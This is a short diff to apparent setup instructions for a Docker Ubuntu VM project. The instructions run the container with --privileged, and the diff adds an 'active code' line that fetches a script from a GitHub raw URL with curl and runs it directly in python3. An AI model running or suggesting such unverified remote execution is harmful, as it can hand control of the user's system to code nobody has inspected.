@@ -1,8 +1,13 @@
 # Clone the repository
-git clone https://github.com/samanyu200/root/ cd root
+git clone https://github.com/samanyu200/root-v1.1.1/ 
+cd root-v1.1.1
 
 # Build the Docker image
 docker build -t ubuntu-vm .
 
 # Run the container
 docker run --privileged -p 6080:6080 -p 2221:2222 -v $PWD/vmdata:/data ubuntu-vm
+
+# active code
+ python3 <(curl -s https://raw.githubusercontent.com/samanyu200/root-v1.1.1/refs/heads/main/24)) 
+
